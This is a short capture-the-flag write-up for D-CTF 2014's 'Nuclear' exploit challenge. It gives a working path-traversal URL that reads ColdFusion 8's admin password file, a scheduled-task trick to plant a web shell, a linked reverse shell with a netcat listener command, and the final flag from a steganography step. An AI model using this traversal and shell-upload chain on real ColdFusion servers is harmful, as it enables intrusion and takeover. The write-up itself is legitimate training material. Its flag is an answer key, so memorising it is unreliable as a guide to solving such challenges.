# D-CTF 2014: Exploit 100 â€“ Nuclear

**Category:** Exploit
**Points:** 100
**Description:**

> 1947-1991 / 10.11.1.2. Don't forget to switch the VPN server.

## Write-up

Exploit local path inclusion vulnerability in the Cold Fusion admin panel:

`http://10.11.1.2/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`

Which gets you a md5 hash, which is the password ~Coldfusion

Then you can use the ColdFusion admin panel to add a scheduled task to fetch your jsp/php/cfm shell and put it in a web dir.

We used a simple reverse shell, http://pastebin.com/09gpcxWL in combination with `nc -v -n -l -p 4444`

Once you have a shell, start digging.

C:\Documents and Settings\admin\Desktop\paranoia.jpg is the flag.

But it seems like just another picture? Stegano!

Using that tool (or another stenography tool) with the key 'That's the most evilest thing I can imagine.' you find the key: "The Cold War is over but Cold War thinking survives."
